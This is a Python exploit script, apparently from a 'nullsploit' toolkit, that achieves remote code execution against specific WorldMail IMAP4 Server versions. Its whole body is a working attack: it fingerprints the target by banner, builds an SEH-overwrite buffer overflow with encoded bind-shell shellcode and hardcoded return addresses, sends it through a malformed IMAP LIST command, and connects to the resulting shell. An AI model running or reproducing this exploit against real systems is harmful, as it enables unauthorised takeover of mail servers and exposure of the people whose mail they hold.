#!/usr/bin/env python
"""
    nullsploit :: Remote Code Executon for WorldMail3.0 IMAP Server

    AUTHOR :: TheXero
    WEBSITE :: www.nullsecurity.net

"""
import sys
if "." not in sys.path: 
    sys.path.append(".")
import struct
from shellcode import generate as shellcode
import encoder
import exploitutils
import time

TARGETS                         = {
    0 : ['WorldMail IMAP4 Server 6.1.19', struct.pack("<I", 0x10013B4E)],
    1 : ['WorldMail IMAP4 Server 6.1.20', struct.pack("<I", 0x10022187)],
    2 : ['WorldMail IMAP4 Server 6.1.22', struct.pack("<I", 0x10022187)],
    3 : ['Debug', struct.pack("<I",0x42424242)]
    }

def main():
    parser = exploitutils.arguments()
    args = parser.parse_args()

    if args.PORT:
        PORT = int(args.PORT)
    else:
        PORT = int(143)
   
    if args.PAYLOAD:
        PAYLOAD = str(args.PAYLOAD)
    else:
        PAYLOAD = 'win32bind'
    
    if args.PARGS:
        ARGS = args.PARGS
    else:
        ARGS = ''
 
    if args.targets:
        print " Exploit targets available:"
        print " ========================="
        for i in TARGETS:
            print " " + str(i) + " | " + TARGETS[i][0]
        sys.exit()

    if args.RHOST:
        HOST = str(args.RHOST)
    else:
        parser.print_help()
        sys.exit()

    if args.check:
        checkVulnerability( HOST, PORT )
        sys.exit()
    
    if args.TARGET:
        TARGET = TARGETS[int(args.TARGET)][1]
    else:
        print "\033[1;33;40m Automatic target selection\033[0;37;40m"
        TARGET = checkVulnerability( HOST, PORT )

    if args.force:
        if not args.TARGET:
            print "\033[1;31;40m [!] Set a target before launching exploit\033[0;37;40m"
            sys.exit()
        run( HOST, PORT, TARGET, PAYLOAD, ARGS )
        sys.exit()
   
    run( HOST, PORT, TARGET, PAYLOAD, ARGS)

def checkVulnerability(HOST, PORT):
    # Check banner
    response = exploitutils.bannercheck(HOST, PORT)
    
    if response == False:
        print "\033[1;31;40m [!] Exploit failed!"
        sys.exit()
    for i in TARGETS:
        if TARGETS[i][0] in response:
            #print " Received %s" % response
            print "\033[1;32;40m [+] Target appears exploitable\033[0;37;40m"
            return TARGETS[i][1]

    print "\033[1;31;40m [-] Received %s" % response
    print "\033[1;31;40m [!] Target is not vulnerable\033[0;37;40m"
    sys.exit()

def makeSploit( TARGET, PAYLOAD, ARGS ):
    # Exploit variables
    OFFSET=768
    BADCHARS='\x00\x0a\x0d\x20\x7b'
    
    # Generate and encode the shellcode
    SHELLCODE = shellcode( PAYLOAD, ARGS )
    ENCODED_SHELLCODE = encoder.xor( SHELLCODE, BADCHARS )
    
    # Construct the attack
    stack= "\x90"*12
    stack+= ENCODED_SHELLCODE
    stack+= exploitutils.randomstring( OFFSET - len(stack) )
    stack+= "\xeb\x06\x90\x90" # Next SEH
    stack+= TARGET # SEH
    stack+=("\xdb\xc5\xbd\xfc\x37\x63\x33\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x03"
    "\x31\x6f\x17\x83\xc7\x04\x03\x93\x24\x81\xc6\xea\x8f\x81\x2c\xec"
    "\x0f\xf5\xcb")

    SPLOITSTRING = "a0001 LIST }" + stack + "}\r\n"
    return SPLOITSTRING

def run( HOST, PORT, TARGET, PAYLOAD, PARGS ):
   
    SPLOITSTRING = makeSploit( TARGET, PAYLOAD, PARGS )
    SUCCESS = exploitutils.tcpexploit( HOST, PORT, SPLOITSTRING )
    if SUCCESS != True:
        print "\033[1;33;40m [!] Exploit failed!\033[0;37;40m"
        sys.exit()
    sys.stdout.write(" Waiting for exploit to finish")
    sys.stdout.flush()
    time.sleep(1)
    sys.stdout.write(" 4")
    sys.stdout.flush()
    time.sleep(1)
    sys.stdout.write(" 3")
    sys.stdout.flush()
    time.sleep(1)
    sys.stdout.write(" 2")
    sys.stdout.flush()
    time.sleep(1)
    sys.stdout.write(" 1")  
    sys.stdout.flush()
    time.sleep(1)
    sys.stdout.write("\r")  
    sys.stdout.flush() 
    sys.stdout.write("                                      ")
    sys.stdout.write("\r")  
    #sys.stdout.flush()    
    #print "\033[1;32;40m [+] Retrieving our shell!\033[0;37;40m\n"
    exploitutils.handler( HOST, PAYLOAD )

main()
